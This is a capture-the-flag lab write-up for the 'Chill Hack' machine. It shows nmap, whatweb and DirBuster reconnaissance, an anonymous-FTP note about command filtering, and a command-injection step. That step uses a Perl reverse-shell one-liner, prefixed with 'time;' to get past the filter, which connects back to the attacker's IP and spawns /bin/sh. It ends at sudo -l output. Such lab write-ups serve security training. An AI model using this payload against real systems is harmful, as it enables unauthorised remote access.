---
description: Chill the Hack out of the Machine.
---

# Chill Hack

## Scanner

> Generated on **Mon Aug 9 06:15:10 2021** with `nmap 7.91`.

{% tabs %}
{% tab title="nmap" %}
```bash
nmap -sV -n -v -Pn -p- -T4 -A --open -oX portScan.xml 10.10.35.158
```
{% endtab %}

{% tab title="Output" %}
```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-09 06:15 EDT
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 06:15
Completed NSE at 06:15, 0.00s elapsed
Initiating NSE at 06:15
Completed NSE at 06:15, 0.00s elapsed
Initiating NSE at 06:15
Completed NSE at 06:15, 0.00s elapsed
Initiating SYN Stealth Scan at 06:15
Scanning 10.10.35.158 [65535 ports]
Discovered open port 21/tcp on 10.10.35.158
Discovered open port 22/tcp on 10.10.35.158
Discovered open port 80/tcp on 10.10.35.158
Completed SYN Stealth Scan at 06:15, 15.01s elapsed (65535 total ports)
Initiating Service scan at 06:15
Scanning 3 services on 10.10.35.158
Completed Service scan at 06:15, 6.16s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against 10.10.35.158
Retrying OS detection (try #2) against 10.10.35.158
Retrying OS detection (try #3) against 10.10.35.158
Retrying OS detection (try #4) against 10.10.35.158
Retrying OS detection (try #5) against 10.10.35.158
Initiating Traceroute at 06:15
Completed Traceroute at 06:15, 0.05s elapsed
NSE: Script scanning 10.10.35.158.
Initiating NSE at 06:15
NSE: [ftp-bounce] PORT response: 500 Illegal PORT command.
Completed NSE at 06:15, 1.68s elapsed
Initiating NSE at 06:15
Completed NSE at 06:15, 0.34s elapsed
Initiating NSE at 06:15
Completed NSE at 06:15, 0.00s elapsed
Nmap scan report for 10.10.35.158
Host is up (0.046s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.8.228
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 7EEEA719D1DF55D478C68D9886707F17
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Game Info
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=8/9%OT=21%CT=1%CU=41771%PV=Y%DS=2%DC=T%G=Y%TM=61110051
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11
OS:NW7%O6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(
OS:R=Y%DF=Y%T=40%W=F507%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Uptime guess: 14.145 days (since Mon Jul 26 02:47:15 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   44.70 ms 10.9.0.1
2   46.01 ms 10.10.35.158

NSE: Script Post-scanning.
Initiating NSE at 06:15
Completed NSE at 06:15, 0.00s elapsed
Initiating NSE at 06:15
Completed NSE at 06:15, 0.00s elapsed
Initiating NSE at 06:15
Completed NSE at 06:15, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.36 seconds
           Raw packets sent: 65655 (2.893MB) | Rcvd: 65621 (2.636MB)

```
{% endtab %}
{% endtabs %}

## Open Ports and Running Services

### 10.10.35.158 \(Linux 3.1 - 95%\)

| Port | State | Service | Version |
| :--- | :--- | :--- | :--- |
| 21/tcp | open | ftp | vsftpd 3.0.3 |
| 22/tcp | open | ssh | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 80/tcp | open | http | Apache httpd 2.4.29 |

{% hint style="info" %}
**FTP Anonymous account detected by nmap**

```text
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
```

Content of `note.txt`:

```text
$ cat note.txt            
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```
{% endhint %}

{% tabs %}
{% tab title="whatweb" %}
```text
whatweb 10.10.35.158
```
{% endtab %}

{% tab title="Output" %}
```text
http://10.10.35.158 [200 OK] 
Apache[2.4.29]
Bootstrap
Country[RESERVED][ZZ]
Email[demo@gmail.com]
Frame
HTML5
HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)]
IP[10.10.35.158]
JQuery[1.11.1]
Script
Title[Game Info]
X-UA-Compatible[IE=edge]
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="OWASP DirBuster 1.9-RC1" %}
* Target URL: [http://10.10.35.158/](http://10.10.35.158/)
* File with list of dirs/files: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
* File extension: \*
{% endtab %}

{% tab title="Report" %}
```text
DirBuster 1.0-RC1 - Report
http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
Report produced on Mon Aug 09 06:31:33 EDT 2021
--------------------------------

http://10.10.35.158:80
--------------------------------
Directories found during testing:

Dirs found with a 200 response:

/
/images/
/js/
/css/
/fonts/
/secret/
/secret/images/

Dirs found with a 403 response:

/icons/
/icons/small/


--------------------------------
Files found during testing:

Files found with a 200 responce:

/index.html
/about.html
/team.html
/news.html
/blog.html
/contact.html
/js/3dslider.js
/js/custom.js
/js/animate.js
/js/hoverdir.js
/js/jquery.prettyPhoto.js
/js/jquery.vide.js
/js/map.js
/js/modernizer.js
/js/owl.carousel.js
/js/portfolio.js
/js/all.js
/js/retina.js
/js/scroll.js
/css/3dslider.css
/css/animate.css
/css/bootstrap-theme.css
/css/bootstrap-theme.css.map
/css/bootstrap-theme.min.css
/css/bootstrap-theme.min.css.map
/css/bootstrap.css
/css/bootstrap.css.map
/css/bootstrap.min.css
/css/custom.css
/css/flaticon.css
/css/font-awesome.css
/css/bootstrap.min.css.map
/css/font-awesome.min.css
/css/owl.carousel.css
/css/prettyPhoto.css
/css/responsive.css
/fonts/Flaticon.eot
/fonts/Flaticon.svg
/fonts/Flaticon.ttf
/fonts/Flaticon.woff
/fonts/_flaticon.scss
/fonts/FontAwesome.otf
/fonts/flaticon.css
/fonts/flaticon.html
/fonts/fontawesome-webfont.eot
/fonts/fontawesome-webfont.svg
/fonts/fontawesome-webfont.ttf
/fonts/fontawesome-webfont.woff
/fonts/fontawesome-webfont.woff2
/fonts/glyphicons-halflings-regular.eot
/fonts/glyphicons-halflings-regular.ttf
/fonts/glyphicons-halflings-regular.svg
/fonts/glyphicons-halflings-regular.woff
/fonts/glyphicons-halflings-regular.woff2


--------------------------------

```
{% endtab %}
{% endtabs %}

{% hint style="info" %}
**Dirbuster found a relevant URL!**

* \*\*\*\*[http://10.10.35.158/secret/](http://10.10.35.158/secret/)
{% endhint %}

```text
time;perl -e 'use Socket;$i="10.9.8.228";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

```text
www-data@ubuntu:/$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```

